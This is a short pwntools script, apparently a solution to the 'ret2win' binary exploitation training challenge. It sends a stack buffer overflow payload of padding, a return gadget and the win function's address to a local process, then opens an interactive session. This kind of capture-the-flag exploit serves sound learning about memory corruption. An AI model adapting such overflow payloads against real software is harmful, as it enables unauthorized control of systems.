from pwn import *

p = process('./ret2win')

# gdb.attach(p)

payload = b'A'*40 + p64(0x40053e) + p64(0x400756)

p.recvuntil('> ')
p.sendline(payload)

p.interactive()
